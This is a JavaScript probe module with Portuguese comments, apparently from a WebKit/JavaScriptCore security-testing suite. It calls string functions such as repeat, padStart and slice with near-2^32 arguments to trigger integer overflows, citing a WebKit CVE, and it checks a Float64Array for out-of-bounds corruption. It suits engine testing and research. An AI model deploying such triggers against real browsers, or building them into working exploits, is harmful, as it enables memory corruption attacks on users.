/**
 * SC_STRING_INT_OVERFLOW.JS
 * Categoria : JS ENGINE — Integer Overflow
 * Alvo      : JSC JSString / StringPrototype native functions
 * Técnica   : Chama repeat(), padStart(), padEnd(), slice() e
 *             String.fromCharCode() com argumentos que causam overflow
 *             de inteiro 32-bit no cálculo do tamanho final da string.
 *             Um overflow pode levar à alocação de buffer menor que o
 *             necessário, causando OOB write na JSString heap.
 * Referência: CVE-2021-30666 (WebKit JSString integer overflow)
 */

export default {
    id:          'STRING_INT_OVERFLOW',
    category:    'JS ENGINE',
    risk:        'HIGH',
    description: 'Overflow em repeat/padStart com argumentos ~2^31. '
                + 'Testa alocação incorreta de buffer na JSString heap.',

    /* ── estado interno ──────────────────────────────────────────────── */
    _victim:   null,
    _results:  null,

    supported: function() { return true; },

    /* ── setup ──────────────────────────────────────────────────────── */
    setup: async function() {
        this._results = {};
        // Float64Array vítima para detectar OOB na JSString heap
        this._victim = new Float64Array(16);
        this._victim.fill(2.2222222222222);
        await new Promise(r => setTimeout(r, 0));
    },

    /* ── trigger ─────────────────────────────────────────────────────── */
    trigger: async function() {
        const MAX32 = 0xFFFFFFFF;
        const MAX31 = 0x7FFFFFFF;

        // 1) repeat() com count enorme — deve lançar RangeError, mas antes
        //    pode calcular o tamanho internamente com overflow
        try { 'a'.repeat(MAX32);       } catch(_) {}
        try { 'ab'.repeat(MAX31);      } catch(_) {}
        try { 'abc'.repeat(MAX31 / 3); } catch(_) {}

        // 2) padStart com targetLength overflow
        try { 'x'.padStart(MAX32, 'AB');  } catch(_) {}
        try { 'x'.padEnd(MAX32, 'CD');    } catch(_) {}
        try { ''.padStart(MAX31 + 1, 'Z'); } catch(_) {}

        // 3) String.fromCharCode com array gigante
        try {
            const codes = new Uint16Array(65535);
            codes.fill(65); // 'A'
            String.fromCharCode(...codes);
        } catch(_) {}

        // 4) slice com índices extremos
        const s = 'A'.repeat(1024);
        try { this._results.slice1 = s.slice(-MAX32, MAX32)?.length; } catch(_) {}
        try { this._results.slice2 = s.slice(MAX31, MAX31 + 10)?.length ?? 0; } catch(_) {}

        // 5) concat gigante
        try {
            let acc = '';
            for (let i = 0; i < 100; i++) acc += 'A'.repeat(65535);
            this._results.concatLen = acc.length;
        } catch(_) {}

        await new Promise(r => setTimeout(r, 0));
    },

    /* ── probes ──────────────────────────────────────────────────────── */
    probe: [
        // [0-4] resultados das operações
        s => s._results.slice1  ?? -1,
        s => s._results.slice2  ?? -1,
        s => s._results.concatLen ?? -1,
        s => typeof s._results.slice1,
        s => typeof s._results.concatLen,

        // [5-7] vítima Float64 — detecta OOB write na JSString heap
        s => s._victim[0],
        s => s._victim[8],
        s => s._victim[15],

        // [8] integridade do array vítima
        s => s._victim.every(v => Math.abs(v - 2.2222222222222) < 1e-10) ? 'clean' : 'CORRUPTED',
        s => s._victim.byteLength,

        // [9-10] strings simples ainda funcionam?
        s => 'hello'.repeat(3),
        s => 'world'.padStart(10, '0'),
    ],

    /* ── cleanup ─────────────────────────────────────────────────────── */
    cleanup: async function() {
        this._victim  = null;
        this._results = null;
    }
};
